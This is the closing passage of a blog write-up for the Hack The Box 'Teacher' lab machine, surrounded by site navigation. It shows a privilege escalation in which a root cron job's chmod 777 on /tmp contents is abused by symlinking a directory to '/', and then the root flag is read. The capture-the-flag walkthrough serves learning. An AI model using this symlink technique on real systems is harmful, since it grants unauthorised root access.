</pre></table></code></div></div><p>So the <code class="language-plaintext highlighter-rouge">backup.sh</code> script is owned by <code class="language-plaintext highlighter-rouge">root</code> and running the above script. Basically, it moves to <code class="language-plaintext highlighter-rouge">/tmp</code> and extract the <code class="language-plaintext highlighter-rouge">backup_courses.tar.gz</code> and <code class="language-plaintext highlighter-rouge">chmod</code> everything to <code class="language-plaintext highlighter-rouge">777</code> (= full permission). Let’s remove the <code class="language-plaintext highlighter-rouge">courses/</code> directory and create a symlink to <code class="language-plaintext highlighter-rouge">/</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">giovanni@teacher:~/work/tmp$</span><span class="w"> </span><span class="nb">rm</span> <span class="nt">-rf</span> courses/
<span class="gp">giovanni@teacher:~/work/tmp$</span><span class="w"> </span><span class="nb">ln</span> <span class="nt">-s</span> / courses
</pre></table></code></div></div><p><b>root.txt</b></p><p>After the cronjob runs again, we will have a full <code class="language-plaintext highlighter-rouge">777</code> permission to <code class="language-plaintext highlighter-rouge">/</code> directory and read <code class="language-plaintext highlighter-rouge">root.txt</code> flag.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">giovanni@teacher:~/work/tmp$</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">4f3a ***REDACTED*** 1209
</span></pre></table></code></div></div><p>Thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/linux/'>Linux</a>, <a href='/categories/easy/'>Easy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/teacher/" class="post-tag no-text-decoration" >teacher</a> <a href="/tags/moodle-rce/" class="post-tag no-text-decoration" >moodle RCE</a> <a href="/tags/cronjob/" class="post-tag no-text-decoration" >cronjob</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://bigb0sss.github.io/posts/htb-teacher-writeup/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="https://twitter.com/intent/tweet?text=HTB - Teacher Write-up - bigb0ss&url=https://bigb0sss.github.io/posts/htb-teacher-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Teacher Write-up - bigb0ss&u=https://bigb0sss.github.io/posts/htb-teacher-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Teacher Write-up - bigb0ss&url=https://bigb0sss.github.io/posts/htb-teacher-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/redteam-rotate-ip-aws-gateway/">Rotating Source IPs (Part 1) - AWS API Gateway</a><li><a href="/posts/htb-servmon-writeup/">HTB - ServMon Write-up</a></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-frolic-writeup/"><div class="card-body"> <span class="timeago small" > Nov 18 <i class="unloaded">2020-11-18T10:36:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Valentine Write-up</h3><div class="text-muted small"><p> This was an easy difficulty box. Good learning path for: Source Code Review (Client-side JavaScript Authentication) Puzzles - Various Encoding Programming Bruteforcing Password Protected .ZI...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder-writeup/"><div class="card-body"> <span class="timeago small" > Oct 24 <i class="unloaded">2020-10-24T11:25:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Blunder Write-up</h3><div class="text-muted small"><p> This box was pretty simple and easy one to fully compromise. Good learning path for: BLUDIT CMS 3.9.2 Brute-force Mitigation Bypass BLUDIT CMS 3.9.2 Directory Traversal Exploit CVE-2019-1428...</p></div></div></a></div><div class="card"> <a href="/posts/htb-valentine-writeup/"><div class="card-body"> <span class="timeago small" > Nov 15 <i class="unloaded">2020-11-15T06:36:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Valentine Write-up</h3><div class="text-muted small"><p> This was an easy difficulty box. Good learning path for: OpenSSL Heartbleed Vulnerability OpenSSL RSA Private Key Decrypt Tmux Running as Root Privilege Escalation Initial Recon Nmap Let...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/cloud-az-500/" class="btn btn-outline-primary"><p>Azure - AZ-500 Exam</p></a> <a href="/posts/htb-servmon-writeup/" class="btn btn-outline-primary"><p>HTB - ServMon Write-up</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//bigb0ss-blog.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://bigb0sss.github.io/posts/htb-teacher-writeup/'; this.page.identifier = '/posts/htb-teacher-writeup/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://www.linkedin.com/in/danielsmin">bigb0ss</a>. <span data-toggle="tooltip" data-placement="top" title="CC BY 4.0 ">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://bigb0sss.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">[-] No result found</p>' }); </script>
